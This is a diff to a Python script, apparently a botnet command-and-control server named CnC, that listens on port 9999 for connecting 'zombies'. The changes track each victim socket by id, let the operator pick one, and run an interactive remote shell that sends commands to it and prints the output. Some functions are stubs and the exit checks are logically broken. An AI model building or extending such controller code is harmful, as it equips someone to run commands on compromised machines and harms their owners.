@@ -5,6 +5,7 @@ import os
 #For clean exit we use sys
 import sys
 import threading
+import multiprocessing as Process
 
 class CnC:
     def __init__(self):
@@ -13,6 +14,7 @@ class CnC:
         self.port = 9999
         self.Ccomand = ''
         self.Active = []
+        self.sockets = []
         self.socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         #This is not the fix for freeing up socket
         self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -25,11 +27,15 @@ class CnC:
         except socket.error:
             print("Could not create socket for the server")
             sys.exit()
+        id = 1
         while True:
             client_socket, addr = self.socket.accept()
             self.Active.append(addr)
+            self.sockets.append((id,client_socket,addr))
             client_thread = threading.Thread(target=self.handler,args=(client_socket,addr))
+            print("Starting a new thread")
             client_thread.start()
+            id += 1
         os.remove("temp")
     
     def handler(self,client_socket,addr):
@@ -46,7 +52,9 @@ class CnC:
                 client_socket.send(b"ACK")
         with open("temp","a+") as t:
                 t.write(str(addr[0]) + ':' + str(addr[1])+'\n')
-    def options(self):#,client_socket,client_addr):
+        #temporary code (Problem is running things in parallel)
+        self.options(client_socket,addr)
+    def options(self,client_socket,client_addr):
         while True:
             self.Ccommand = input("<*> ")
             #List active connections etc.
@@ -56,7 +64,10 @@ class CnC:
                 self.activate()
             #For commandline execution
             elif self.Ccommand == 'connect':
-                self.connect(client_socket)
+                for i in self.sockets:
+                    print(f"{i[0]}) {i[2][0]}:{i[2][1]}")
+                id = int(input("Enter the id of the zombie you'd like to connect to: "))
+                self.connect(self.sockets[id-1][1])
             #For sending some sort of file
             elif self.Ccommand == 'send':
                 self.send()
@@ -76,8 +87,10 @@ class CnC:
 
     
     def list(self):
+        x = 1
         for i in self.Active:
-            print(i[0]+ ":" + i[1])
+            print(str(x)+") "+i[0]+ ":" + str(i[1]))
+            x += 1
 
     def activate(self):
         pass
@@ -88,14 +101,16 @@ class CnC:
         print('<*> Shell initialised!')
         command = ''
         while command != 'terminate\n' or 'exit\n':
-            '''client_socket.send(bytes("pwd",'utf-8'))
-            dir = client_socket.recv(4096).decode()
-            command = input(dir+'> ')'''
-            command = input("<*SHELL*> ")
-            if (command.lower() != ('terminate\n' or 'exit\n')) and (command != "\n"):
+            client_socket.send(bytes("pwd",'utf-8'))
+            dir = client_socket.recv(4096).decode().strip("\n")
+            command = input(dir+'> ')
+            #command = input("<*SHELL*> ")
+            if (command.lower() != ('terminate' or 'exit')) or (command != ""):
                 #print(command)
                 client_socket.send(bytes(command,'utf-8'))
                 print(client_socket.recv(4096).decode(),end="")
+            elif command.lower() == 'terminate' or 'exit':
+                break
     
     def send(self):
         pass
